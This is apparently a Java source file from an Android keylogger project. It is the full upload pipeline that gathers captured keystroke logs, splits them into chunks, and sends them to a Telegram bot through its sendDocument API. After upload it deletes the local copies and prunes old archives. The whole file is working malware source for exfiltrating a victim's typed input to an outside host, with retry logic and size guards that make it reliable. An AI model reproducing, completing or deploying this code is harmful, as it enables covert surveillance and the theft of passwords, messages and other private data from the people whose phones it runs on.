package com.bshu2.androidkeylogger;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.regex.Pattern;

/**
 * The whole rotate/upload/prune pipeline, callable from both the accessibility
 * service and the alarm receiver. Nothing here touches the UI thread: every
 * method is blocking and must run on a worker.
 */
final class UploadPipeline {

    static final String TAG = "Keylogger";
    static final String PENDING_FILE = "pending.txt";
    static final String OUTBOX_DIR = "outbox";

    private static final String TELEGRAM_API = "https://api.telegram.org/bot";

    // Size guards. Telegram Bot API rejects documents above 50 MB.
    private static final long MAX_CHUNK_BYTES = 8L * 1024L * 1024L;
    private static final long MAX_UPLOAD_BYTES = 45L * 1024L * 1024L;
    private static final int ARCHIVE_KEEP_DAYS = 7;

    private static final Pattern DAILY_ARCHIVE =
            Pattern.compile("keylog_\\d{8}\\.txt");

    private static final String PREFS = "keylogger";
    private static final String KEY_LAST_RUN = "last_upload_at";

    // Cheap main-thread-readable mirror of KEY_LAST_RUN, so the self-heal
    // check does not touch SharedPreferences (disk) on every event.
    private static volatile long cachedLastRun = -1L;

    private UploadPipeline() {
    }

    static File logDir(Context ctx) {
        File dir = ctx.getExternalFilesDir(null);
        if (dir == null) dir = ctx.getFilesDir();
        if (dir != null && !dir.exists()) dir.mkdirs();
        return dir;
    }

    private static SharedPreferences prefs(Context ctx) {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
    }

    /** Wall-clock time of the last completed run, 0 when never run. */
    static long lastRunAt(Context ctx) {
        long cached = cachedLastRun;
        if (cached >= 0) return cached;
        long stored = prefs(ctx).getLong(KEY_LAST_RUN, 0L);
        cachedLastRun = stored;
        return stored;
    }

    private static void markRun(Context ctx) {
        long now = System.currentTimeMillis();
        cachedLastRun = now;
        prefs(ctx).edit().putLong(KEY_LAST_RUN, now).apply();
    }

    /**
     * Rotates pending.txt, uploads the outbox, prunes old archives. Blocking;
     * call from a worker. Serialized so the alarm and the service never race
     * on the same files.
     */
    static synchronized void run(Context ctx) {
        TelegramConfig.Config config = TelegramConfig.load(ctx);
        if (!config.isConfigured()) {
            Log.e(TAG, "BOT_TOKEN / CHAT_ID not set; events will only be saved locally");
        }
        rotatePending(ctx);
        uploadOutbox(ctx, config);
        pruneArchives(ctx);
        markRun(ctx);
    }

    static void append(File file, String line) {
        try {
            FileOutputStream fos = new FileOutputStream(file, true);
            fos.write(line.getBytes(StandardCharsets.UTF_8));
            fos.close();
        } catch (Exception e) {
            Log.e(TAG, "local write failed", e);
        }
    }

    /**
     * Moves pending.txt into the outbox, splitting it into chunks of at most
     * MAX_CHUNK_BYTES so no single upload can approach Telegram's 50 MB cap.
     */
    static void rotatePending(Context ctx) {
        File pending = new File(logDir(ctx), PENDING_FILE);
        if (!pending.exists() || pending.length() == 0) return;

        File outbox = new File(logDir(ctx), OUTBOX_DIR);
        if (!outbox.exists() && !outbox.mkdirs()) {
            Log.e(TAG, "cannot create outbox dir");
            return;
        }

        if (pending.length() > MAX_CHUNK_BYTES) {
            splitPending(pending, outbox);
            return;
        }

        String base = "keylog_" + fileStamp().format(new Date());
        File snapshot = uniqueFile(outbox, base);
        if (!pending.renameTo(snapshot) && !copyAndTruncate(pending, snapshot)) {
            Log.e(TAG, "rotate failed");
        }
    }

    private static SimpleDateFormat fileStamp() {
        return new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US);
    }

    /** Returns a non-existing file, appending a counter if the name is taken. */
    private static File uniqueFile(File dir, String base) {
        File f = new File(dir, base + ".txt");
        int n = 1;
        while (f.exists()) {
            f = new File(dir, base + "_" + n + ".txt");
            n++;
        }
        return f;
    }

    /** Splits an oversized pending.txt into timestamped, line-aligned chunks. */
    private static void splitPending(File pending, File outbox) {
        String base = fileStamp().format(new Date());
        int part = 0;
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        List<File> written = new ArrayList<>();
        BufferedReader reader = null;
        try {
            reader = new BufferedReader(new InputStreamReader(
                    new FileInputStream(pending), StandardCharsets.UTF_8));
            String line;
            while ((line = reader.readLine()) != null) {
                byte[] bytes = (line + "\n").getBytes(StandardCharsets.UTF_8);
                if (buf.size() > 0 && buf.size() + bytes.length > MAX_CHUNK_BYTES) {
                    written.add(writeChunk(outbox, base, part++, buf.toByteArray()));
                    buf.reset();
                }
                buf.write(bytes, 0, bytes.length);
            }
            if (buf.size() > 0) written.add(writeChunk(outbox, base, part, buf.toByteArray()));
        } catch (Exception e) {
            Log.e(TAG, "split failed", e);
            // Never leave half-written chunks that would be uploaded twice.
            for (File f : written) {
                if (!f.delete()) Log.w(TAG, "could not remove partial chunk " + f.getName());
            }
            return; // keep pending.txt intact for the next attempt
        } finally {
            try { if (reader != null) reader.close(); } catch (Exception ignored) { }
        }

        try {
            new FileOutputStream(pending, false).close(); // truncate only on success
        } catch (Exception e) {
            Log.e(TAG, "truncate failed", e);
        }
    }

    private static File writeChunk(File outbox, String base, int part, byte[] data)
            throws Exception {
        File target = uniqueFile(outbox,
                String.format(Locale.US, "keylog_%s_%03d", base, part));
        FileOutputStream out = null;
        try {
            out = new FileOutputStream(target);
            out.write(data);
            out.flush();
        } finally {
            try { if (out != null) out.close(); } catch (Exception ignored) { }
        }
        return target;
    }

    /** renameTo can fail across mounts; fall back to copy + truncate. */
    private static boolean copyAndTruncate(File src, File dst) {
        FileInputStream in = null;
        FileOutputStream out = null;
        boolean ok = false;
        try {
            in = new FileInputStream(src);
            out = new FileOutputStream(dst);
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
            out.flush();
            out.close();
            out = null;
            in.close();
            in = null;
            new FileOutputStream(src, false).close();
            ok = true;
            return true;
        } catch (Exception e) {
            Log.e(TAG, "rotate failed", e);
            return false;
        } finally {
            try { if (in != null) in.close(); } catch (Exception ignored) { }
            try { if (out != null) out.close(); } catch (Exception ignored) { }
            // A half-copied snapshot must never be uploaded as if it were whole.
            if (!ok && dst.exists() && !dst.delete()) {
                Log.w(TAG, "could not remove partial snapshot " + dst.getName());
            }
        }
    }

    /** Deletes daily archives older than ARCHIVE_KEEP_DAYS. */
    private static void pruneArchives(Context ctx) {
        File[] files = logDir(ctx).listFiles();
        if (files == null) return;

        long cutoff = System.currentTimeMillis()
                - (ARCHIVE_KEEP_DAYS * 24L * 60L * 60L * 1000L);
        for (File f : files) {
            if (!f.isFile() || !DAILY_ARCHIVE.matcher(f.getName()).matches()) continue;
            if (f.lastModified() >= cutoff) continue;
            if (f.delete()) Log.d(TAG, "pruned " + f.getName());
        }
    }

    /** Uploads every queued file in order; deletes only on success. */
    private static void uploadOutbox(Context ctx, TelegramConfig.Config config) {
        if (!config.isConfigured()) return;

        File outbox = new File(logDir(ctx), OUTBOX_DIR);
        File[] files = outbox.listFiles();
        if (files == null || files.length == 0) return;
        Arrays.sort(files); // filenames are timestamped, so this is chronological

        for (File f : files) {
            if (!f.isFile() || f.length() == 0) {
                if (!f.delete()) Log.w(TAG, "could not delete empty " + f.getName());
                continue;
            }
            if (f.getName().endsWith(".failed")) continue; // already sidelined
            if (f.length() > MAX_UPLOAD_BYTES) {
                // Too big for Telegram; stop retrying so it cannot block the queue.
                File parked = new File(f.getParentFile(), f.getName() + ".failed");
                if (f.renameTo(parked)) {
                    Log.e(TAG, "oversized, parked as " + parked.getName());
                }
                continue;
            }
            String caption = config.deviceName + " log " + f.getName();
            if (sendDocument(f, caption, config)) {
                if (!f.delete()) Log.w(TAG, "could not delete uploaded " + f.getName());
                Log.d(TAG, "uploaded " + f.getName());
            } else {
                Log.e(TAG, "upload failed, will retry next cycle: " + f.getName());
                break; // keep order; retry the rest next cycle
            }
        }
    }

    /**
     * Streams the file to Telegram without buffering it in heap.
     * Returns true when Telegram accepted the document.
     */
    private static boolean sendDocument(File file, String caption,
                                        TelegramConfig.Config config) {
        String boundary = "----Keylogger" + System.currentTimeMillis();
        HttpURLConnection c = null;
        FileInputStream in = null;
        try {
            byte[] head = multipartHead(boundary, caption, file.getName(), config.chatId);
            byte[] tail = ("\r\n--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8);
            long total = head.length + file.length() + tail.length;

            URL url = new URL(TELEGRAM_API + config.botToken + "/sendDocument");
            c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(15000);
            c.setReadTimeout(120000);
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            c.setFixedLengthStreamingMode(total);

            OutputStream os = c.getOutputStream();
            os.write(head);

            in = new FileInputStream(file);
            byte[] buf = new byte[16384];
            int n;
            while ((n = in.read(buf)) > 0) os.write(buf, 0, n);
            in.close();
            in = null;

            os.write(tail);
            os.flush();
            os.close();

            int code = c.getResponseCode();
            if (code < 200 || code >= 300) {
                Log.e(TAG, "sendDocument http=" + code);
                return false;
            }
            Log.d(TAG, "sendDocument ok http=" + code
                    + " file=" + file.getName() + " bytes=" + file.length());
            return true;
        } catch (Exception e) {
            Log.e(TAG, "sendDocument failed", e);
            return false;
        } finally {
            try { if (in != null) in.close(); } catch (Exception ignored) { }
            if (c != null) c.disconnect();
        }
    }

    private static byte[] multipartHead(String boundary, String caption, String filename,
                                        String chatId) throws Exception {
        ByteArrayOutputStream head = new ByteArrayOutputStream();
        writeField(head, boundary, "chat_id", chatId);
        writeField(head, boundary, "caption", caption);
        head.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
        head.write(("Content-Disposition: form-data; name=\"document\"; filename=\""
                + filename + "\"\r\n").getBytes(StandardCharsets.UTF_8));
        head.write("Content-Type: text/plain\r\n\r\n".getBytes(StandardCharsets.UTF_8));
        return head.toByteArray();
    }

    private static void writeField(OutputStream os, String boundary, String name, String value)
            throws Exception {
        os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
        os.write(("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n")
                .getBytes(StandardCharsets.UTF_8));
        os.write(value.getBytes(StandardCharsets.UTF_8));
        os.write("\r\n".getBytes(StandardCharsets.UTF_8));
    }

}
